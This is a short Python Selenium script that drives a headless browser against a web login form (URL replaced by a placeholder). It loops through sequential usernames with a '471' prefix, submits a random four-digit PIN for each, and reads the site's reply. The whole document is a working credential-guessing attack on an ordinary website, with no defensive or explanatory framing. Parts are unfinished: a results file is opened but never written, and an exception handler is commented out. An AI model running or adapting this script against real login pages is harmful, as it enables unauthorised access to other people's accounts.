import selenium
from selenium import webdriver
import time
from random import randint

driver = webdriver.PhantomJS()
driver.set_window_size(1024, 768)
file = open('user2.txt', 'a')
driver.get("NECO TU")

i = 37880
while i < 10**5:
	user = '471' + str(i).zfill(5)
	pasw = str(randint(0, 9999)).zfill(4)
	print(user, ':', pasw)
	username_field = driver.find_element_by_id('ctl00_C_Pm_LC_PgLogin_LoginTb_tb')
	username_field.clear()
	username_field.send_keys(user)
	driver.find_element_by_id('ctl00_C_Pm_LC_PgLogin_PasswordTb_tb').send_keys(pasw)
	driver.find_element_by_id('ctl00_C_Pm_LC_PgLogin_LoginBtn').click()
	#	except selenium.common.exceptions.NoSuchElementException:
	#		pass

	#time.sleep(1)

	answer = driver.find_element_by_id('ctl00_C_Pm_messageBox1').text
	answer = answer.split('\n')[1]



file.close()
#words.close()